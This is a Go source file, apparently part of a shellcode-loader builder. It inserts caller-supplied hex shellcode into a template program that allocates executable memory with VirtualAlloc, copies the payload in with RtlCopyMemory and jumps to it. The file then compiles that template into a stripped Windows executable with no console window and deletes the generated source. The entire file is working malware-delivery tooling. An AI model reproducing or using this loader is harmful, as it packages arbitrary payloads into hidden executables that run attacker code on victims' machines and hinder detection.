package server

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

func OutExeFile(s string) {
	var temp = `
package main

import (
	"encoding/hex"
	"syscall"
	"unsafe"
)

func main() {
   shellCode, _ := hex.DecodeString("` + s + `")
	VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
	RtlCopyMemory := syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellCode)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellCode[0])), uintptr(len(shellCode)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}` //go模板
	name, err := GetRand()
	if err != nil {
		name = "ZheTian"
	}
	uHome, _ := os.UserHomeDir()
	_, exist := os.Stat(uHome + "\\tmp")
	if os.IsNotExist(exist) {
		err = os.Mkdir(uHome+"\\tmp", os.ModePerm)
		if err != nil {
			fmt.Println("Temporary folder creation failed.")
			os.Exit(-1)
		}
	}
	fileName := uHome + "\\tmp\\" + name + ".go"
	f, e := os.Create(fileName)
	if e != nil {
		fmt.Println("Failed to build source file.")
		os.Exit(-1)
	}
	_, err = f.WriteString(temp)
	if err != nil {
		fmt.Println("Code writing to file failed.")
		os.Exit(-1)
	}
	f.Close()
	cmd := exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-s -w -H windowsgui", name+".go")
	cmd.Dir = uHome + "\\tmp"
	if cmd.Run() != nil {
		fmt.Println("Code packaging failed,Please check that the go language running environment is correct.")
		os.Exit(-1)
	}
	fmt.Println("Executable built successfully.", fmt.Sprintf("filePath: %s\\tmp\\%s.exe", uHome, name))
	//等待cmd执行完毕一秒后删除源码文件
	time.Sleep(1 * time.Second)
	os.Remove(fileName)
	os.Exit(1)
}
